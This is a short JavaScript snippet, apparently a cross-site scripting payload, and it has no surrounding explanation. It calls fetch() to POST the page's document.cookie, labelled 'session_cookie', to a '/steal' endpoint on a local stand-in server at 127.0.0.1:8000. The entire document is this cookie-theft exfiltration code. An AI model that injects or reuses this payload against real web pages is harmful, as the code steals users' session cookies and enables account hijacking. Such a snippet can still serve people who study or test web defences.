fetch("http://127.0.0.1:8000/steal", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ session_cookie: document.cookie })
});